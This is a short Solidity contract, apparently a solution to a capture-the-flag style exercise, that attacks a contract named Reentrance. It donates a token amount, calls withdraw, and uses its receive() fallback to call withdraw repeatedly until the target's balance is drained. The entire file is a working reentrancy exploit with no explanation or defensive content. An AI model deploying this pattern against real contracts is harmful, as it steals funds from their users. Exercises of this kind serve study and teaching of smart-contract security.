// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    Reentrance public reentrance;

    constructor(address payable _reentrance) payable {
        reentrance = Reentrance(_reentrance);
    }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw();
        }
    }

    function hackContract() external payable{
        reentrance.donate{value: 1}(address(this));
        reentrance.withdraw();
    }
}
